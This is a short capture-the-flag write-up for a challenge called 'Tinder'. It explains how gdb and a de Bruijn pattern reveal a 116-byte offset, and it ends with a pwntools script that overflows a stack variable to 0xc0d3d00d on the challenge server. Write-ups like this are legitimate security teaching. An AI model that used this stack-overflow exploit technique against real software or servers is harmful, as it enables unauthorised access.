# Tinder

It gets a bunch of input from us using a function called input that does some multiplication a value, lets call this number "num", and then calls fgets\(var,num,stdin\), basically reading num bytes into "var". By stepping through the program and looking at every function call of input, we see the last one has the largest value, so I just went with that even though they'd all probably work.

Later on, there are some interesting instructions. Namely these two:

```text
cmp DWORD PTR [ebp-0xc], 0xc0d3d00d
jne <main+443>
```

Note that these two lines are at `main+247` - that's quite a jump. It compares some variable on the stack to `0xc0d3d00d` and jumps away if they aren't equal. If they are equal, it goes on to execute some instructions including fopen, fgets, puts etc. - probably printing the flag from flag.txt.

Using gdb, I set a breakpoint at the instruction that compares `ebp-0xc` to `0xc0d3d00d`. Then at the fourth input I pasted in a de brujin pattern generated by pattern.py. At the breakpoint, I read `ebp-0xc`, and pasted this value back into pattern.py. This gives 116 bytes until we overwrite this variable, so our payload is just

```text
enter whatever you want into the first three inputs
enter 116 bytes + p32(0xc0d3d00d) on the fourth input
Script below, even though this doesnt really need a script(a dynamic one, I mean)
```

```python
from pwn import *
NUM_TO_VAR = 116
padding = b'A' * NUM_TO_VAR
p = remote('p1.ljctf.org',8002)
[p.sendline('t') for _ in range(3)] # If you send nothing it'll rage
payload = padding + p32(0xc0d3d00d)
p.sendline(payload)
p.interactive()
```

